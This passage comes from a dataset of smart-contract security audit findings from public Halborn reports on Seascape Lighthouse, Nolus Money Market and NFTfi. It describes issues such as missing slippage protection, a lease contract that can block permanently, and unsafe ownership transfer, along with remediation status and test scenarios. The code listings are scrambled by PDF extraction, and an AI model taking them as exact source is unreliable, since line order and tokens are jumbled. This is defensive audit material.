( _fundCollector != address (0) , \" Lighthouse : ZERO_ADDRESS \"); require ( _fundCollector != owner () , \" Lighthouse : USED_OWNER \" ); fundCollector = _fundCollector ; 43 44 45 46 47 } 20 Risk Level: Likelihood - 1 Impact - 3 Recommendations: The code should be consistent and the same checks should be applied on the setters and declaration declaration. The owner check should also be applied on the constructor. Remediation Plan: SOLVED: Fixed in commit 7fcd3b7cfaae3e134c3dd1ca08700c1788002c62 21 ", "labels": ["Halborn", "Seascape_Lighthouse", "Severity: Low"]}, {"title": "TAUTOLOGY EXPRESSION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Lighthouse_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "On LighthouseTier, on the claim and use function the level will always be >= than 0 since the datatype uint8 is used. This means that the level >= 0 check is redundant and only the level < 4 is required. Code Location: Listing 7: contracts/LighthouseTier (Lines 117) 116 function claim ( uint8 level , uint8 v , bytes32 r , bytes32 s ) external { require ( level >= 0 && level < 4, 117 INVALID_PARAMETER \"); \" LighthouseTier : Listing 8: contracts/LighthouseTier (Lines 153) 152 function use ( address investor , uint8 level ) external { 153 require ( level >= 0 && level < 4, \" LighthouseTier : INVALID_PARAMETER \"); Risk Level: Likelihood - 1 Impact - 1 Recommendations: Removing tautology expressions would reduce computation gas costs. 22 Remediation Plan: SOLVED: Fixed in commit 0c4e98aff297ce2beeba3a94eb9ab86299e6efeb 23 ", "labels": ["Halborn", "Seascape_Lighthouse", "Severity: Informational"]}, {"title": "UNUSED VARIABLES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Lighthouse_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The scaledRatio variable of the Prefund struct on the LighthouseProject contract is only set but not used on any aspect of the code. If this variable was used on a frontend, the same value could be obtained by using scaledAllocation and scaledCompensation (prefund.scaledAllocation / prefund.scaledCompensation). Removing the variable would reduce gas costs and storage costs on the smart contract. Code Location: Listing 9: contracts/LighthouseProject (Lines 39) 29 struct Prefund { 30 31 32 uint256 startTime ; uint256 endTime ; uint256 [3] investAmounts ; // Amount of tokens that user can invest , depending on his tier uint256 [3] collectedAmounts ; // Amount of tokens that users invested so far . uint256 [3] pools ; // Amount of tokens that could be invested in the pool . address token ; investor // Token to accept from uint256 scaledAllocation ; uint256 scaledCompensation ; uint256 scaledRatio ; // prefund PCC allocation // prefund Crowns compensation // Pool to compensation ratio 33 34 35 36 37 38 39 40 } Listing 10: contracts/LighthouseProject (Lines 190) 188 189 190 auction . scaledAllocation auction . scaledCompensation prefund . scaledRatio = auctionAllocation * SCALER ; = auctionCompensation * SCALER ; = prefund . scaledAllocation / prefund . scaledCompensation ; 24 Risk Level: Likelihood - 1 Impact - 1 Recommendations: Unused variables should be removed, this would reduce gas storage and computation gas costs. Remediation Plan: SOLVED: Fixed in commit bcca74d12ef00c6236c78eda5f62f2d66095096d 25 ", "labels": ["Halborn", "Seascape_Lighthouse", "Severity: Informational"]}, {"title": "INCONSISTENT CONSTRUCTORS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Lighthouse_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The LighthouseMint and LighthouseBurn constructors do have different constructor parameters order. If the contract deployment is automated and the scripts are reused this could lead to bad behaviours. Code Location: Listing 11: contracts/LighthouseMint (Lines 36) 36 constructor ( address _lighthouseAuction , address _lighthousePrefund , address _lighthouseTier , address _project , address _crowns ) { Listing 12: contracts/LighthouseBurn (Lines 36) 36 constructor ( address _lighthouseAuction , address _lighthousePrefund , address _lighthouseTier , address _crowns , address _project ) { Risk Level: Likelihood - 1 Impact - 1 Recommendations: It is a good practice to keep the same order of parameters to prevent The _crowns and copy-pasting/automation issues during deployment. _project parameters should match those of the other constructor. Remediation Plan: SOLVED: Fixed in commit 025f8bf9c552062896da7749d0ebd1372941ef6b 26 ", "labels": ["Halborn", "Seascape_Lighthouse", "Severity: Informational"]}, {"title": "FUNCTION AND REQUIRE TYPOS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Lighthouse_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The deleteEditorEditor on the LighthouseProject contract should be named deleteEditor to keep consistency with the other declared methods. The prefund method on the LighthousePrefund contract, does contain the Lighthouse: REGISTRATION_NOT_INITIALIZED require should statement this with message Lighthouse: message, changed the to be PREFUND_NOT_INITIALIZED to reflect the actual reason of revert. Code Location: Listing 13: contracts/LighthouseProject (Lines 105) 104 // / @notice Remove the tier user . 105 function deleteEditorEditor ( address _user ) external onlyOwner { 106 require ( _user != address (0) , \" Lighthouse : ZERO_ADDRESS \"); require ( editors [ _user ], NO_USER \" ); editors [ _user ] = false ; emit ProjectEditor ( _user , false ); 107 108 109 110 111 112 } \" Lighthouse : Listing 14: contracts/LighthousePrefund (Lines 55) 53 // / @dev v , r , s are used to ensure on server side that user passed KYC 54 function prefund ( uint256 projectId , int8 certainTier , uint8 v , bytes32 r , bytes32 s ) external payable { require ( lighthouseProject . prefundInitialized ( projectId ) , \" Lighthouse : REGISTRATION_NOT_INITIALIZED \"); require (! prefunded ( projectId , msg . sender ) , \" Lighthouse : 55 56 ALREADY_PREFUNDED \"); 27 57 require ( certainTier > 0 && certainTier < 4, \" Lighthouse : INVALID_CERTAIN_TIER \"); Risk Level: Likelihood - 1 Impact - 1 Recommendations: It is recommended to fix typos in smart contracts so that the code is clearer and more understandable. Remediation Plan: SOLVED: Fixed in commit 7fcd3b7cfaae3e134c3dd1ca08700c1788002c62 28 ", "labels": ["Halborn", "Seascape_Lighthouse", "Severity: Informational"]}, {"title": "NO SLIPPAGE PROTECTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nolus_Money_Market_CosmWasm_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The exact_amount_in function in the packages/swap/src/trx.rs file does not consider slippage. This means that the user may not receive the exact amount of tokens that they expect. In large swap transactions, there is a risk known as sandwich attacks. These occur when MEV algorithms on Osmosis purchase significant amounts of the asset involved in the swap. This action drives the price of the asset up before the swap occurs. These algorithms then sell the asset at this higher price, making a profit. As a result, the user conducting the swap might end up paying more for the asset than they initially expected. Code Location:  packages/swap/src/trx.rs#L24-L51 Listing 38,41,46) 1: nolus-money-market/packages/swap/src/trx.rs (Lines G: Group , 24 pub fn exact_amount_in <G >( trx : & mut Transaction , 25 sender : HostAccount , 26 token_in : & CoinDTO <G >, 27 28 swap_path : & SwapPath , 29 ) -> Result <() > 30 where 31 32 { 33  the DEX pools 34  the formula at 35 36  minimum amount . // TODO bring the token balances , weights and swapFee -s from // into the oracle in order to calculate the tokenOut as per // https :// docs . osmosis . zone / osmosis - core / modules / gamm /# swap . // Then apply the parameterized maximum slippage to get the 19 // For the first version , we accept whatever price impact and 37  slippage . 38 39 40 41 42 43 44 45 46 47 48 49 50 51 } }; const MIN_OUT_AMOUNT : & str = \" 1 \"; let routes = to_route ( swap_path ) ?; let token_in = Some ( to_cwcoin ( token_in ) ?) ; let token_out_min_amount = MIN_OUT_AMOUNT . into () ; let msg = MsgSwapExactAmountIn { sender : sender . into () , routes , token_in : token_in . map ( Into :: into ) , token_out_min_amount , trx . add_message ( REQUEST_MSG_TYPE , msg ); Ok (() ) BVSS: AO:A/AC:L/AX:M/C:N/I:N/A:N/D:H/Y:N/R:N/S:U (5.0) Recommendation: It is recommended to consider slippage when calculating the minimum amount of tokens that the user should receive. Note that the TODO comment in the code snippet above indicates that this is already planned. Remediation plan: ACKNOWLEDGED: The Nolus team acknowledged this finding. 20 ", "labels": ["Halborn", "Nolus_Money_Market_CosmWasm", "Severity: Medium"]}, {"title": "THE LEASE CONTRACT COULD BE BLOCKED DURING STATE TRANSITION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nolus_Money_Market_CosmWasm_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The Leaser creates a new Lease contract each time a user makes a open_lease request. This contract works like a state machine, moving from one state to another depending on the status of the loan granted to the user. There are 10 different states, divided into four main phases (opening, opened, paid, closed). In each phase, the transition from one state to another is done automatically, without any external interaction. Since this money market is going to operate with different currencies, both the communication with a DEX and the use of an Oracle are essential. The DEX used currently is Osmosis, which involves IBC communication for the exchange of currencies. IBC communication implies that transactions are not atomic, so synchronization and resilience of the different com- The Neutron SDK is used as ponents in the communication is critical. middleware to manage IBC packets during communications. It has been observed during the dynamic tests that, in case of error in the Lease contract, for example, if the oracle price feed does not work correctly, the error at the moment of trying to buy the asset is not propagated and handled by the contract, it is only notified to the ContractManager module, so the Lease contract has no information to revert the operations due to the error, nor the possibility to advance to the next state, leaving the contract in a state of permanent blocking. BVSS: AO:S/AC:L/AX:L/C:N/I:N/A:C/D:H/Y:H/R:N/S:U (2.8) 21 Recommendation: It is recommended to ensure that all possible failures in non-atomic transactions, especially those related to interchain communication prob- lems, are handled by the contract, reverting to a previous state if necessary. Remediation Plan: SOLVED: The Nolus team has addressed the issues inherited from the use of NeutronSDK. These problems could be grouped into four categories:  The handling of 'sudo' messages is not atomic: The handling of sudo messages is not atomic: A failure in the processing of a sudo submessage does not revert the state changes made by the processing of the main sudo message. The Neutron team has solved this with a new version.  IBC messages sent as part of the handling of a 'sudo' message are not forwarded: On successful processing of a sudo message, the Neutron SDK ignores the emitted events. The Neutron team has fixed this with a new version.  'Out-of-gas' is treated as an error returned by the smart contract These errors are received and logged in its contractmanager : module. Instead, out-of-gas errors should be returned to the relayers reversing the transactions and allowing the next IBC packet delivery attempts. The Neutron team plans to fix this in their next release, so as a workaround until the solution is ready, the Nolus team has developed and deployed a lease healing feature that recovers leases left in an invalid state. Commit IDs: 78734bf, 9b18a47  Guaranteed delivery of Dex ACKs: According to a NeutronSDK design decision, errors returned by smart contracts when delivering ack- s/timeouts/errors are received and logged in their contractmanager module. For now, there is no means for contracts to request a sub- sequent delivery. 22 Leveraging Nolus Money Markets time alarms, Nolus team has devel- oped a solution to guarantee the delivery of Dex ACKs. It is based on the Cosmwasm actor model and the ability to gain control of er- rors occurring in a sub-message. If the first delivery fails, the ResponseDelivery leverages the guaranteed delivery of time alarms by scheduling a time alarm to make a delivery attempt on the next alarm sending cycle. Commit IDs: 16b1886, 4e84944 23 ", "labels": ["Halborn", "Nolus_Money_Market_CosmWasm", "Severity: Low"]}, {"title": "TVL RATES CANNOT BE UPDATED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nolus_Money_Market_CosmWasm_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The configuration of TVL-to-APR rates in the Rewards Dispatcher contract is performed on contract instantiation. Although the contract allows updating some configuration parameters by a governance proposal, the only value that can be updated is the cadence_hours. The RewardScale parameter tvl_to_apr cannot be updated after instantiation. Code Location:  contracts/dispatcher/src/contract.rs#L100-L106 Listing (Line 103) 2: nolus-money-market/contracts/dispatcher/src/contract.rs 100 pub fn sudo ( deps : DepsMut < '_ >, _env : Env , msg : SudoMsg ) ->  ContractResult < CwResponse > { 101 102 103 match msg { SudoMsg :: Config { cadence_hours } => { Config :: update ( deps . storage , cadence_hours ). map (|() |  response :: empty_response () ) } } 104 105 106 } 107 BVSS: AO:S/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:M/R:N/S:U (1.0) 24 Recommendation: It is recommended to consider the possibility of modifying the TVL-to- APR parameter in case it needs some modification in the future due to strategic decisions. Remediation Plan: SOLVED: The Nolus team has solved this issue in the commit ID 65aff6ab19256578271cbaba70c4519313d24497. 25 ", "labels": ["Halborn", "Nolus_Money_Market_CosmWasm", "Severity: Informational"]}, {"title": "ICA TRANSACTIONS DO NOT TIP THE RECEIVER RELAYER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nolus_Money_Market_CosmWasm_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "Interchain Standard 29 (ICS 29), also known as relayer fees, is a feature aimed at incentivizing Inter-Blockchain Communication (IBC) in- frastructure within the Cosmos ecosystem. ICS 29 is designed to make the job of relayers more sustainable by providing an incentivization layer that rewards relayer operators for successfully relaying packets. The standard defines three types of relayers: Forward relayer, who submits the recv_packet message for a given packet; Reverse relayer, who sub- mits the ack_packet message for a given packet; and Timeout relayer, who submits the timeout_packet message for a given packet It was identified that the ICA (Interchain Accounts) transactions do not tip the receiver relayer. Not tipping for the reception of packets (recv _fee) in the IBC protocol may lead to a reduced incentive for relayers to perform this operation, potentially impacting the reliability and efficiency of packet transmission across the blockchain networks. Code Location:  packages/platform/src/ica.rs#L61-L89 Listing 3 connection : Conn , trx : Transaction , memo : M , timeout : Duration , ack_tip : Coin <C >, timeout_tip : Coin <C >, 1 pub fn submit_transaction < Conn , M , C >( 2 3 4 5 6 7 8 ) -> Batch 9 where 26 batch . schedule_execute_no_reply ( NeutronMsg :: submit_tx ( Conn : Into < String >, M: Into < String >, C: Currency , let mut batch = Batch :: default () ; connection . into () , ICA_ACCOUNT_ID . into () , trx . into_msgs () , memo . into () , timeout . secs () , IbcFee { 10 11 12 13 { 14 15 16 17 18 19 20 21 22 23 24 25  timeout_tip )], 26 27 28 )); batch }, recv_fee : vec! [] , ack_fee : vec! [ coin_legacy :: to_cosmwasm_impl ( ack_tip )], timeout_fee : vec! [ coin_legacy :: to_cosmwasm_impl ( BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to allow tipping for the reception of packets (recv_fee ) in the IBC protocol by adding a recv_tip parameter to the submit_- transaction function and passing it to the IbcFee struct. Remediation Plan: ACKNOWLEDGED: The Nolus team acknowledged this finding, stating that: Neutron does not support recv_fee. We follow the Neutrons solution for tips/fees for the relayers until they eventually migrate to the ICS standard one. 27 ", "labels": ["Halborn", "Nolus_Money_Market_CosmWasm", "Severity: Informational"]}, {"title": "REDUNDANT FIELD IN THE LOAN STRUCT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nolus_Money_Market_CosmWasm_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "and its loan current_period an The annual_margin_interest. This is a duplicated value that can be removed, as duplicating data can lead to inconsistencies when updating one of the values but not the other. field track both keep of Code Location:  contracts/lease/src/loan/mod.rs#L78-L96 Listing 4 start : Timestamp , lpp_loan : LppLoan , annual_margin_interest : Percent , interest_payment_spec : InterestPaymentSpec , let current_period = Self :: due_period ( annual_margin_interest , start , interest_payment_spec . due_period () , 1 pub ( super ) fn new ( 2 3 4 5 6 ) -> Self { 7 8 9 10 11 12 13 14 15 16 17 18 19 } ); Self { } annual_margin_interest , lpn : PhantomData , lpp_loan , interest_payment_spec , current_period , 28 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to remove the annual_margin_interest field from the loan struct and use the annual_margin_interest field from the current_period struct instead. Remediation Plan: SOLVED: The Nolus team has solved this issue in the commit ID 94fd- cdb01eceb25e9604b933fe48d835d90ca1c6. 29 ", "labels": ["Halborn", "Nolus_Money_Market_CosmWasm", "Severity: Informational"]}, {"title": "DUPLICATE STORAGE READ", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nolus_Money_Market_CosmWasm_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The is_registered function in the Feeders struct reads from the storage twice. The first read is to check if the feeders field is None, and the second read is to get the feeders field. This can be refactored to read from the storage only once, since the may_load function returns an Option that can carry the feeders field if it exists. This applies to the remove function as well, where the update function reads from storage again. Code Location:  packages/marketprice/src/feeders.rs#L43-L51 Listing 5 } return Ok ( false ); if self .0. may_load ( storage ) ?. is_none () { 1 pub fn is_registered (& self , storage : & dyn Storage , address : & Addr )  -> StdResult < bool > { 2 3 4 5 6 7 8 9 } let addrs = self .0. load ( storage ) ?; Ok ( addrs . contains ( address ))  packages/marketprice/src/feeders.rs#L67-L78 Listing 6 1 pub fn remove (& self , deps : DepsMut < '_ >, addr : Addr ) -> Result <() ,  PriceFeedersError > { 2  HashSet < Addr >> { let remove_address = | mut addrs : HashSet < Addr >| -> StdResult < 30 addrs . remove (& addr ); Ok ( addrs ) }; if self .0. may_load ( deps . storage ) ?. is_some () { self .0. update ( deps . storage , remove_address ) ?; } Ok (() ) 3 4 5 6 7 8 9 10 11 12 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to refactor the is_registered function to read from storage only once. Remediation Plan: SOLVED: The Nolus team has solved this issue in the commit ID efcb75d93385e46b44fe420ee264315e8bbb347c for the is_registered function and the commit ID 55cfe785d29eb8b29d5082c24254f10ddbb68b8a for the remove function. 31 ", "labels": ["Halborn", "Nolus_Money_Market_CosmWasm", "Severity: Informational"]}, {"title": "OUTDATED OBSERVATIONS CAN BE STORED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nolus_Money_Market_CosmWasm_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The add_observation function in the Feed struct adds an observation to the observations field. However, there is no check to ensure that the at field of the observation is greater than or equal to the valid_since This can lead to outdated observations being stored in the field. observations field. Note that the outdated observations are filtered out when the calc_price function is called. Code Location:  packages/marketprice/src/feed/mod.rs#L33-L45 Listing 7 mut self , from : Addr , at : Timestamp , price : Price <C , QuoteC >, valid_since : Timestamp , 1 pub fn add_observation ( 2 3 4 5 6 7 ) -> Self { 8 9 10 11 12 13 } self . observations . retain ( observation :: valid_since ( valid_since )) ; self . observations . push ( Observation :: new ( from , at , price )) ; self BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) 32 Recommendation: It is recommended to add a check to ensure that the at field of the observation is greater than or equal to the valid_since field. Remediation Plan: SOLVED: The Nolus team has solved this issue in the commit ID 456837837af0232651dfe6e0955ddbd3d7ee1102. 33 ", "labels": ["Halborn", "Nolus_Money_Market_CosmWasm", "Severity: Informational"]}, {"title": "RELAYER TIPS ARE HARDCODED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nolus_Money_Market_CosmWasm_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "Interchain Standard 29 (ICS 29), also known as relayer fees, is a feature aimed at incentivizing Inter-Blockchain Communication (IBC) in- frastructure within the Cosmos ecosystem. ICS 29 is designed to make the job of relayers more sustainable by providing an incentivization layer that rewards relayer operators for successfully relaying packets. The standard defines three types of relayers: Forward relayer, who submits the recv_packet message for a given packet; Reverse relayer, who sub- mits the ack_packet message for a given packet; and Timeout relayer, who submits the timeout_packet message for a given packet It was found that the relayer tips are hardcoded in the packages/dex/src /trx.rs file. This means that the relayer tips cannot be changed without a code change. Currently, the relayer tips are set to 1unls which is not ideal since the relayer tips should be set to a value that is appropriate for the network. Code Location:  packages/dex/src/trx.rs#L21-L27 Listing 8 1 // TODO take them as input from the client 2 const ICA_TRANSFER_ACK_TIP : Coin < Nls > = Coin :: new (1) ; 3 const ICA_TRANSFER_TIMEOUT_TIP : Coin < Nls > = ICA_TRANSFER_ACK_TIP ; 4 5 // TODO take them as input from the client 6 const ICA_SWAP_ACK_TIP : Coin < Nls > = Coin :: new (1) ; 7 const ICA_SWAP_TIMEOUT_TIP : Coin < Nls > = ICA_SWAP_ACK_TIP ; 34 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to take the relayer tips as input from the client. Note that the TODO comments in the code snippet above indicate that this is already planned. Remediation Plan: ACKNOWLEDGED: The Nolus team acknowledged this finding. 35 MANUAL TESTING 36 In the manual testing phase, the following scenarios were simulated. The scenarios listed below were selected based on the severity of the vulnerabilities Halborn was testing the program for. 5.1 VERIFYING ACCESS CONTROL ON ENTRYPOINTS Access control often represents a vulnerable point in smart contract assessments. To ensure that privileged operations are only accessible by designated users, the following tests were performed: 1. Contract access control: Verify that the privileged entrypoints re- quiring access control could only be invoked by the specified con- tract. For instance, the OpenLoan entrypoint in the LPP contract was accessible only by the Leaser. Figure 1: Try OpenLoan on LPP G N I T S E T L A U N A M Figure 2: Try SendRewards on Treasury 2. User access control: Verify that the entrypoints requiring access control could only be invoked by the specified user. For example, only the user who initially opened a loan could close it or only users who have made a deposit can claim rewards. 37 Figure 3: Claim rewards from other user 3. Configuration updates: Validate that all entrypoints that update or modify configuration parameters could only be invoked by the contract owner or a privileged user. Figure 4: Try to update Lease code 5.2 VERIFYING ERROR HANDLING DURING CONTRACT INSTANTIATION To mitigate potential unintentional errors leading to misconfigurations during contract instantiation, the following tests were performed: 1. Address validation: Verify that addresses are validated before being stored in the configuration. 2. Rates validation: Ensure that the input parameters defined as rates were within the limits of 0%-100%. In the case of the Leaser, it has been also checked the order of the different rates in the liability (e.g: first warning < max). Figure 5: Borrow rate greater than 100% 38 G N I T S E T L A U N A M Figure 6: Liability check 3. No empty objects: Ensure that those objects that are not Optional have valid values (e.g: tvl_to_apr could not contain repeated or empty values). Figure 7: No duplicated values Figure 8: No empty values 5.3 VERIFYING INPUT VALIDATION ON THE ENTRY POINTS Entrypoints lacking access control for privileged accounts/contracts can be executed by any user, allowing any input value. To test the contracts behavior under these circumstances, the following tests were conducted: 1. User Input Validation: the entrypoints were checked before being stored or used in operations. For instance, trying to open a loan with a currency not registered in the PaymentGroup. Verify inputs that user all in 39 G N I T S E T L A U N A M Figure 9: Try OpenLease with wrong currency 2. Configuration updates: configuration entrypoints perform the corresponding input validation, as well as during the instantiation. Verify update that the Figure 10: Update input validation 5.4 VERIFYING REPEATED OPERATIONS Executing entrypoints in an unexpected order or more than once can lead To address this, the following tests were to unpredictable behavior. performed: 1. Multiple Rewards distribution before claim (out of the Alarm system): Verify that the number of rewards assigned to each lender remained accurate even when distributed at different moments. 2. Dex setup repetition: Confirm that the DEX, once set up, could not be modified. Figure 11: Dex setup repetition 40 G N I T S E T L A U N A M 3. Loan repayment and closure: Confirm that a loan could not be closed before being repaid and that it could not be repaid or closed twice Figure 12: Try to close an unpaid loan G N I T S E T L A U N A M 41 ", "labels": ["Halborn", "Nolus_Money_Market_CosmWasm", "Severity: Informational"]}, {"title": "POSSIBLE LOSS OF OWNERSHIP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_DirectLoanFixedOffer_Redeployment_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When transferring ownership of the protocol, no checks are performed on whether the new address is valid and active. In case there is a mistake when transferring the ownership, the whole protocol is locked out of its permissioned functionalities. Code Location: Listing 1: Ownable.sol function transferOwnership ( address _newOwner ) public virtual require ( _newOwner != address (0) , \" Ownable : new owner is 48  onlyOwner { 49  the zero address \" ); 50 51 } _setOwner ( _newOwner ); Risk Level: Likelihood - 1 Impact - 5 Recommendation: The transfer of ownership process should be split into two different transactions, the first one calling the requestTransferOwnership function which proposes a new owner for the protocol, and the second one, the new owner accepts the proposal by calling acceptsTransferOwnership function. 13 Remediation Plan: RISK ACCEPTED: The NFTfi team accepted the risk of this finding. The team most likely will implement the remediation when they upgrade the platform. 14 ", "labels": ["Halborn", "NFTfi_DirectLoanFixedOffer_Redeployment", "Severity: Medium"]}, {"title": "ZERO ADDRESS NOT CHECKED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_DirectLoanFixedOffer_Redeployment_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the constructor of the DirectLoanFixedOfferRedeploy.sol contract, admin and nfthub contract address variables are not being checked to avoid pointing to the zero address, extending this issue to the parent contracts. Code Location: Listing 2: DirectLoanFixedOfferRedeploy.sol 72 73 74 75 76 77 78 constructor ( address _admin , address _nftfiHub , address [] memory _permittedErc20s ) DirectLoanFixedOffer ( _admin , _nftfiHub , _permittedErc20s ) { // solhint - disable - previous - line no - empty - blocks } Risk Level: Likelihood - 2 Impact - 1 Recommendation: When setting an address variable, always make sure the value is not zero. Remediation Plan: ACKNOWLEDGED: The NFTfi team acknowledged this issue. 15 ", "labels": ["Halborn", "NFTfi_DirectLoanFixedOffer_Redeployment", "Severity: Informational"]}, {"title": "USE I++ INSTEAD OF ++I IN LOOPS FOR GAS OPTIMIZATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_DirectLoanFixedOffer_Redeployment_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the setERC20Permits function, within the loop, the variable i is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. This also affects variables incremented inside the loop code block. Code Location: Listing 3: DirectLoanBaseMinimal.sol (Line 374) 371 function setERC20Permits ( address [] memory _erc20s , bool []  memory _permits ) external onlyOwner { 372 require ( _erc20s . length == _permits . length , \"  setERC20Permits function information arity mismatch \"); 373 374 375 376 377 for ( uint256 i = 0; i < _erc20s . length ; i ++) { _setERC20Permit ( _erc20s [i ], _permits [ i ]) ; } } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of a uint variable inside a loop for gas saving. 16 Remediation Plan: ACKNOWLEDGED: The NFTfi team acknowledged this issue. 17 MANUAL TESTING 18 In the manual testing phase, the following scenarios were simulated. The scenarios listed below were selected based on the severity of the vulnerabilities Halborn was testing the program for. 4.1 SCENARIOS TESTED  Test 1: Lending - Borrow - normal repay procedure  Test 2: Lending - Borrow and repay Out Of Time (revert expected)  Test 3: Lending - Borrow - Out Of Time - normal liquidation procedure  Test 4: Lending - Borrow and liquidate ahead of schedule (revert expected)  Test 5: Lending - Borrow - Out of time - Renegotiate - normal repay procedure  Test 6: Attack: Borrower tries to renegotiate their own loan to steal the NFT (revert expected) Script The following test environment was set up for the purposes of executing the above scenarios: Listing 4: NFTFi.t.sol 1 // SPDX - License - Identifier : UNLICENSED 2 pragma solidity 0.8.4; 3 4 import \" forge - std / Test . sol \"; 5 import \" ../ src / contracts / NftfiHub . sol \"; 6 import \" ../ src / contracts / loans / direct / loanTypes /  DirectLoanFixedOfferRedeploy . sol \"; 7 import \" @openzeppelin / contracts / utils / cryptography / ECDSA . sol \"; 8 import \" ../ src / contracts / mocks / NFT . sol \" ; 9 import \" ../ src / contracts / mocks / NFTWrapper . sol \" ; 10 import \" ../ src / contracts / loans / direct / DirectLoanCoordinator . sol \"; 11 import \" ../ src / contracts / mocks / SimpleERC20 . sol \"; 12 import \" ../ src / contracts / permittedLists /  PermittedNFTsAndTypeRegistry . sol \"; 13 import \" ../ src / contracts / loans / direct / loanTypes / LoanData . sol \"; 14 15 contract NftfiTest is Test { 19 G N I T S E T L A U N A M NFT internal nftContract ; NFTWrapper internal nftWrapper ; SmartNft internal nftPromissoryNote ; SmartNft internal nftObligationReceipt ; SimpleToken internal token ; NftfiHub internal nftFiHub ; DirectLoanCoordinator internal directLoanCoordinator ; DirectLoanFixedOfferRedeploy internal using ECDSA for bytes32 ; PermittedNFTsAndTypeRegistry internal 16 17 18 19 20 21 22 23 24 25  directLoanFixedOfferRedeploy ; 26  permittedNFTsAndTypeRegistry ; 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 address internal owner ; address internal admin ; address internal alice ; address internal bobby ; address internal carla ; address internal edgar ; address internal zeroo ; uint256 internal verifyingSignerPrivateKey ; address internal verifyingSigner ; address internal dappIdentifier1 ; address internal sender ; address [] internal permittedErc20s ; string [] internal contractKeys ; address [] internal contractAddresses ; string [] internal definedNftTypes ; address [] internal definedNftWrappers ; address [] internal permittedNftContracts ; string [] internal permittedNftTypes ; uint256 internal timeNow = block . timestamp ; uint256 internal day = 86400; string [] internal loanTypes ; address [] internal loanContracts ; bool internal liquidated ; /* *************** */ /* ADDRESSES SETUP */ function setUp () public { G N I T S E T L A U N A M 20 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 /* *************** */ // ADDRESSES DECLARATION owner = vm . addr (0 xAA ); alice = vm . addr (0 xAB ); bobby = vm . addr (0 xAC ); carla = vm . addr (0 xAD ); edgar = vm . addr (0 xAE ); zeroo = address (0) ; admin = owner ; // 100 ETHER PER ADDRESS vm . deal ( owner , 100 ether ); vm . deal ( alice , 100 ether ); vm . deal ( bobby , 100 ether ); vm . deal ( carla , 100 ether ); vm . deal ( edgar , 100 ether ); // LABELING ADDRESSES vm . label ( owner , \" owner \" ); vm . label ( alice , \" alice \" ); vm . label ( bobby , \" bobby \" ); vm . label ( carla , \" carla \" ); vm . label ( edgar , \" edgar \" ); /* ***************** */ /* ENVIRONMENT SETUP */ /* ***************** */ // DEPLOYING NFTWRAPPER vm . prank ( admin ); nftWrapper = new NFTWrapper () ; // DEPLOYING NFT CONTRACT vm . prank ( admin ); nftContract = new NFT ( address ( nftWrapper )) ; // MINT 5 NFTS TO ALICE vm . prank ( alice ); nftContract . mintNFT (5) ; // DEPLOYING AND MINTING TOKEN vm . prank ( admin ); G N I T S E T L A U N A M 21 101 token = new SimpleToken ( \" token \" , \" TKN \" , 1000000  _000000000000000000 ); 102 103 104 105 106 107 108 109 110 111 112 113 vm . prank ( admin ); token . transfer ( alice , 50 _000000000000000000 ); vm . prank ( admin ); token . transfer ( bobby , 1000 _000000000000000000 ); vm . prank ( admin ); token . 